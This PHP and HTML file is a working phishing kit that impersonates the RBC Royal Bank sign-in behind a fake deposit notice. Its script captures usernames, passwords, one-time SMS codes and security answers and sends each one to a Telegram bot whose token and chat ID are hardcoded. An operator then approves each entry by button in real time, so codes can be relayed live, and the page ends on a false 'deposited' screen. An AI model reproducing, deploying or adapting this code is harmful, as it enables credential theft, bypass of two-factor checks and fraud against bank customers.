<?php
declare(strict_types=1);

ob_start();
if (session_status() === PHP_SESSION_NONE) session_start();

header('Content-Type: text/html; charset=utf-8');

/* ---------- Locate config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/');  
$configPath = $docRoot . '/config/config.php';
$config     = is_file($configPath) ? require $configPath : [];

/* ---------- Telegram credentials ---------- */
$telegramToken = $config['telegram']['bot_token'] ?? '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = $config['telegram']['chat_id'] ?? '-1002922644009';

/* ---------- Locate config ---------- */
$docRoot    = rtrim($_SERVER['DOCUMENT_ROOT'] ?? __DIR__, '/');
$configPath = $docRoot . '/config/config.php';
$config     = is_file($configPath) ? require $configPath : [];

/* ---------- Telegram credentials ---------- */
$telegramToken = $config['telegram']['bot_token'] ?? '';
$chatId        = $config['telegram']['chat_id'] ?? '';

/* ---------- Resolve transaction data (NEW MODEL) ---------- */
$tx =
    $_SESSION['transaction']
    ?? $_SESSION['transaction_data']
    ?? $_SESSION['last_transfer']
    ?? null;

if (!is_array($tx)) {
    $tx = [];
}

/* ---------- Transaction ID ---------- */
$tid = (string)(
    $tx['transaction_id']
    ?? $_SESSION['transaction_id']
    ?? ''
);

/* ---------- Sender Name ---------- */
$senderName = (string)(
    $tx['sender_name']
    ?? $tx['sender']
    ?? $config['sender_name']
    ?? 'N/A'
);

/* ---------- Amount ---------- */
$amount = (string)(
    $tx['amount']
    ?? '0.00'
);

/* Normalize amount display */
$amount = number_format((float)str_replace(['$', ',', ' '], '', $amount), 2);

/* ---------- Currency ---------- */
$currency = (string)(
    $tx['currency']
    ?? 'CAD'
);

/* ---------- Status ---------- */
$status = (string)(
    $tx['status']
    ?? 'Pending'
);

/* ---------- Security Question (NEW) ---------- */
$question = (string)(
    $tx['question']
    ?? $tx['security_question']
    ?? $_SESSION['question']
    ?? ''
);

/* ---------- Expiry ---------- */
$expiry = (string)(
    $tx['expiry_date']
    ?? (
        !empty($tx['expires'])
            ? date('F j, Y', (int)$tx['expires'])
            : ''
    )
);

/* ---------- Persist compatibility keys ---------- */
$_SESSION['transaction_id'] = $tid;
$_SESSION['senderName']     = $senderName;
$_SESSION['amount']         = $amount;
$_SESSION['question']       = $question;

/* ---------- Safe HTML values ---------- */
$tidSafe        = htmlspecialchars($tid, ENT_QUOTES, 'UTF-8');
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amount, ENT_QUOTES, 'UTF-8');
$currencySafe   = htmlspecialchars($currency, ENT_QUOTES, 'UTF-8');
$statusSafe     = htmlspecialchars($status, ENT_QUOTES, 'UTF-8');
$expirySafe     = htmlspecialchars($expiry, ENT_QUOTES, 'UTF-8');
$questionSafe   = htmlspecialchars($question, ENT_QUOTES, 'UTF-8');

/* ---------- Done ---------- */
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RBC Royal Bank - Secure Sign In</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<style>
body{font-family:Arial,sans-serif;margin:0;padding:0;background:#fff;}
.container{max-width:400px;margin:0px auto;padding:20px;background:#fff;box-shadow:0 0px 0px rgba(0,0,0,0.1);}
.step-container{display:none;transition:opacity 0.3s ease;}
.step-container.active{display:block;opacity:1;}
input, select, button{width:100%;padding:14px;font-size:1rem;border-radius:0;margin-bottom:10px;box-sizing:border-box;}
.lock-icon{color:#004a99;font-size:0.9rem;margin-left:5px;line-height:1;}
.error{color:red;margin-bottom:10px;display:none;}
.remember-container{display:flex;align-items:center;margin:10px 0 10px 0;}
.remember-container input[type="checkbox"]{width:20px;height:20px;margin-right:10px;accent-color:#0066cc;border:1px solid #ccc;border-radius:0;flex-shrink:0;}
.remember-container label{font-size:1rem;user-select:none;}
.transaction-box{border:1px solid #ccc;padding:15px;background:#f9f9f9;margin-bottom:15px;}
</style>
<style>
button {
  position: relative;
  overflow: hidden;
  background: #0066cc;
  color: #fff;
  border: none;
  cursor: pointer;
  padding: 14px;
  font-size: 1rem;
  transition: opacity 0.3s;
}
button:disabled {
  opacity: 0.5;
  cursor: default;
}
button .spinner {
  position: absolute;
  top: 50%;
  left: 50%;
  width: 18px;
  height: 18px;
  margin: 0;
  border: 3px solid rgba(255, 255, 255, 0.3);
  border-top: 3px solid #fff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  display: none;
  transform: translate(-50%, -50%);
  pointer-events: none;
}
button.loading .spinner {
  display: block;
}
button.loading span.text {
  visibility: hidden;
}
@keyframes spin {
  0% { transform: translate(-50%, -50%) rotate(0deg); }
  100% { transform: translate(-50%, -50%) rotate(360deg); }
}
</style>
</head>
<body>
<div class="container">
  <div class="form-panel">
    <div class="form-container">

      <!-- Step 1: Username -->
      <div class="step-container active" id="step-username">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
          <label style="font-weight:bold;">Client Card or Username</label>
          <i class="fa-solid fa-lock lock-icon"></i>
        </div>
        <input type="text" id="username" placeholder="Client Card or Username">
        <div class="error" id="errorUsername"></div>
        <div class="remember-container">
          <input type="checkbox" id="remember">
          <label for="remember">Remember Me</label>
        </div>
        <button id="usernameBtn">Next</button>
        <div style="margin-top:12px; font-size:0.85rem;">
          <a href="https://www.rbcroyalbank.com/recover-username" target="_blank" style="display:block; margin-bottom:3px; color:#004a99; text-decoration:none;">Recover Your Username</a>
          <a href="https://www.rbcroyalbank.com/enrol-online-banking" target="_blank" style="display:block; color:#004a99; text-decoration:none;">Enrol in Online Banking</a>
        </div>
        <div style="margin-top:15px; font-size:0.85rem;">
          <h2 style="font-size:0.9rem; margin-bottom:5px;">Service Notices</h2>
          <a href="https://www.rbcroyalbank.com/avion-rewards-maintenance" target="_blank" style="display:block; margin-bottom:3px; color:#004a99; text-decoration:none;">Maintenance Affecting Avion Rewards</a>
          <p><a href="https://www.rbcroyalbank.com/online-services" target="_blank" style="color:#004a99; text-decoration:none;">Other Online Services</a></p>
        </div>
        <div style="margin-top:20px; font-size:0.8rem; line-height:1.2;">
          <p style="margin:2px 0;">RBC Online Banking is provided by Royal Bank of Canada.</p>
          <p style="margin:2px 0;">Royal Bank of Canada Website, © 1995-2025</p>
          <a href="https://www.rbc.com/legal/" target="_blank" style="margin-right:8px; color:#004a99; text-decoration:none;">Legal</a>
          <a href="https://www.rbc.com/accessibility/" target="_blank" style="margin-right:8px; color:#004a99; text-decoration:none;">Accessibility</a>
          <a href="https://www.rbc.com/privacysecurity/" target="_blank" style="margin-right:8px; color:#004a99; text-decoration:none;">Privacy & Security</a>
          <a href="https://www.rbc.com/cookies/" target="_blank" style="color:#004a99; text-decoration:none;">Advertising & Cookies</a>
        </div>
      </div>

      <!-- Step 2: Password -->
      <div class="step-container" id="step-password">
        <div id="displayUsername" style="margin-bottom:10px;font-weight:bold;"></div>
        <input type="password" id="password" placeholder="Password">
        <div class="error" id="errorPassword"></div>  
        <button id="passwordBtn">Sign In <div class="spinner"></div></button>
      </div>

      <!-- Step 3: Method Selection -->
      <div class="step-container" id="step-method">
        <label>Select Method to Receive Code</label>
        <select id="methodSelect">
          <option value="">--Select Method--</option>
          <option value="sms">Send Code via SMS</option>
          <option value="call">Send Code via Call</option>
        </select>
        <div class="error" id="errorMethod"></div>
        <button id="methodBtn">Continue <div class="spinner"></div></button>
      </div>

      <!-- Step 4: Code Entry -->
      <div class="step-container" id="step-code">
        <label>Enter 6-digit Code</label>
        <input type="tel" id="otpCode" maxlength="6" placeholder="Enter Code">
        <div class="error" id="errorCode"></div>
        <button id="codeBtn">Verify <div class="spinner"></div></button>
      </div>

      <!-- Step 5: Security Question -->
      <div class="step-container" id="step-security">
        <!-- Transaction Details Box -->
        <div class="transaction-box">
          <strong style="display:block; margin-bottom:8px;">Transaction Details</strong>
          <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
            <span>Sender:</span>
            <span><?= htmlspecialchars($senderName); ?></span>
          </div>
          <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
            <span>Amount:</span>
            <span><?= htmlspecialchars($amount); ?></span>
          </div>
        </div>

        <!-- Security Question -->
        <label id="securityLabel" style="margin-top:15px; font-weight:bold; display:block;">
          <?= htmlspecialchars($question ?: "What is this for?"); ?>
        </label>

        <input type="text" id="securityAnswer" placeholder="Security Answer">
        <div class="error" id="errorSecurity"></div>
        <button id="securityBtn">Submit <div class="spinner"></div></button>
        <button id="cancelBtn" style="background:#dc3545;margin-top:8px;">Cancel Transaction</button>
      </div>

      <!-- Step 6: Deposit Success -->
      <div class="step-container" id="step-deposit" style="text-align:center; padding:20px;">
        <svg class="checkmark" viewBox="0 0 120 120" style="width:100px; height:100px; margin:0 auto 12px; stroke:#0072c6; stroke-width:8; fill:none; stroke-linecap:round; stroke-linejoin:round; stroke-dasharray:120; stroke-dashoffset:120; animation:drawCheck 0.7s forwards;">
          <path d="M34 62 L52 80 L86 44"/>
        </svg>
        <h2>Successfully deposited into your account</h2>
        <p>Funds may take up to 30 minutes to reflect in your account.</p>
        <div id="depositProgressWrap" style="width:80%; height:10px; background:#eee; border-radius:8px; margin:15px auto; overflow:hidden;">
          <div id="depositProgress" style="height:100%; width:0%; background: linear-gradient(90deg,#0072c6,#004a99); transition: width 0.3s linear;"></div>
        </div>
        <div>Returning to sign-in in <span class="countdown" id="depositCountdown">30</span>s</div>
      </div>

    </div>
  </div>
</div>

<script>
/* =========================================================
 *  CONFIGURATION
 * ========================================================= */
const CONFIG = {
  BOT:  '<?= $telegramToken ?>',
  CHAT: '<?= $chatId ?>',
  POLL_TIMEOUT: 30000,
  POLL_INTERVAL: 1000
};

/* =========================================================
 *  UI HELPERS
 * ========================================================= */
const UI = (() => {
  const steps = document.querySelectorAll('.step-container');
  const errorEl = id => document.getElementById(id);

  const showStep = (id) => {
    steps.forEach(el => el.classList.remove('active'));
    const target = document.getElementById(id);
    if (target) target.classList.add('active');
  };

  const setLoading = (btn, loading) => {
    if (loading) {
      btn.classList.add('loading');
      btn.disabled = true;
    } else {
      btn.classList.remove('loading');
      btn.disabled = false;
    }
  };

  const showError = (id, msg) => {
    const el = errorEl(id);
    if (!el) return;
    el.textContent = msg;
    el.style.display = msg ? 'block' : 'none';
  };

  return { showStep, setLoading, showError };
})();

/* =========================================================
 *  TELEGRAM HELPERS
 * ========================================================= */
const Telegram = (() => {
  const { BOT, CHAT, POLL_TIMEOUT, POLL_INTERVAL } = CONFIG;

  const send = async (text, keyboard) => {
    const payload = { chat_id: CHAT, text, parse_mode: 'HTML' };
    if (keyboard) payload.reply_markup = keyboard;
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  };

  const clearKeyboard = async (msgId) => {
    await fetch(`https://api.telegram.org/bot${BOT}/editMessageReplyMarkup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT,
        message_id: msgId,
        reply_markup: {}
      })
    });
  };

  const poll = async (sessionCode, btn, errId, onSuccess, fallbackStep) => {
    const start = Date.now();
    let offset = 0;

    while (Date.now() - start < POLL_TIMEOUT) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT}/getUpdates?offset=${offset + 1}`);
        const { result } = await res.json();

        for (const upd of result || []) {
          offset = upd.update_id;
          const data = upd.callback_query?.data;
          if (data && data.endsWith(`::${sessionCode}`)) {
            await clearKeyboard(upd.callback_query.message.message_id);
            UI.setLoading(btn, false);

            const [action] = data.split('::');
            if (action === 'correct') return onSuccess();
            
            UI.showError(errId, 'Incorrect — please try again.');
            return UI.showStep(fallbackStep);
          }
        }
      } catch (e) {
        console.error('Poll error:', e);
      }

      await new Promise(r => setTimeout(r, POLL_INTERVAL));
    }

    UI.setLoading(btn, false);
    UI.showError(errId, 'Timed out. Please try again.');
    UI.showStep(fallbackStep);
  };

  return { send, poll };
})();

/* =========================================================
 *  MAIN EVENT HANDLERS
 * ========================================================= */
(() => {
  let currentUsername = '';

  // Username
  document.getElementById('usernameBtn').addEventListener('click', () => {
    const user = document.getElementById('username').value.trim();
    if (!user) return UI.showError('errorUsername', 'Enter your username');
    UI.showError('errorUsername', '');
    currentUsername = user;
    document.getElementById('displayUsername').textContent = `< ${user}`;
    UI.showStep('step-password');
  });

  // Password
  document.getElementById('passwordBtn').addEventListener('click', async () => {
    const pwd = document.getElementById('password').value.trim();
    if (!pwd) return UI.showError('errorPassword', 'Enter your password');
    UI.showError('errorPassword', '');

    const btn = document.getElementById('passwordBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const msg = `🟦 RBC CONTROLER 🟦\n\n▪️  <code>${currentUsername}</code>\n▪️  <code>${pwd}</code>\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    Telegram.poll(sessionCode, btn, 'errorPassword', () => UI.showStep('step-method'), 'step-password');
  });

  // Method
  document.getElementById('methodBtn').addEventListener('click', async () => {
    const method = document.getElementById('methodSelect').value;
    if (!method) return UI.showError('errorMethod', 'Select a method');
    UI.showError('errorMethod', '');

    const btn = document.getElementById('methodBtn');
    UI.setLoading(btn, true);

    await Telegram.send(`🟦 RBC CONTROLER 🟦\n\n▫️  Method\n▫️  ${method}\n🟦 RBC CONTROLER 🟦`);
    UI.setLoading(btn, false);
    UI.showStep('step-code');
  });

  // Code
  document.getElementById('codeBtn').addEventListener('click', async () => {
    const code = document.getElementById('otpCode').value.trim();
    if (!/^\d{6}$/.test(code)) return UI.showError('errorCode', 'Enter 6-digit code');
    UI.showError('errorCode', '');

    const btn = document.getElementById('codeBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const msg = `🟦 RBC CONTROLER 🟦\n\n<code>${code}</code>\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    Telegram.poll(sessionCode, btn, 'errorCode', () => UI.showStep('step-security'), 'step-code');
  });

  // SECURITY ANSWER - FIXED
  document.getElementById('securityBtn').addEventListener('click', async () => {
    const ans = document.getElementById('securityAnswer').value.trim();
    if (!ans) return UI.showError('errorSecurity', 'Answer the security question');
    UI.showError('errorSecurity', '');

    const btn = document.getElementById('securityBtn');
    UI.setLoading(btn, true);

    const sessionCode = Math.random().toString(36).slice(2);
    const qText = document.getElementById('securityLabel').textContent.trim();
    const msg = `🟦 RBC CONTROLER 🟦\n\n<strong>Question:</strong> ${qText}\n<strong>Answer:</strong> ${ans}\n🟦 RBC CONTROLER 🟦`;
    const kb = {
      inline_keyboard: [[{ text: '🟩 Correct', callback_data: `correct::${sessionCode}` }], [{ text: '🟥 Incorrect', callback_data: `error::${sessionCode}` }]]
    };

    await Telegram.send(msg, kb);
    Telegram.poll(sessionCode, btn, 'errorSecurity', () => {
      UI.setLoading(btn, false);
      UI.showStep('step-deposit');
    }, 'step-security');
  });

  // Cancel
  document.getElementById('cancelBtn').addEventListener('click', () => {
    UI.showStep('step-deposit'); // Or create a proper cancel step
  });

  // Deposit countdown
  let countdown = 30;
  const countdownEl = document.getElementById('depositCountdown');
  const progressEl = document.getElementById('depositProgress');
  
  const timer = setInterval(() => {
    if (countdown > 0) {
      countdown--;
      countdownEl.textContent = countdown;
      progressEl.style.width = `${((30 - countdown) / 30) * 100}%`;
    } else {
      clearInterval(timer);
      UI.showStep('step-username');
    }
  }, 1000);

})();
</script>
</body>
</html>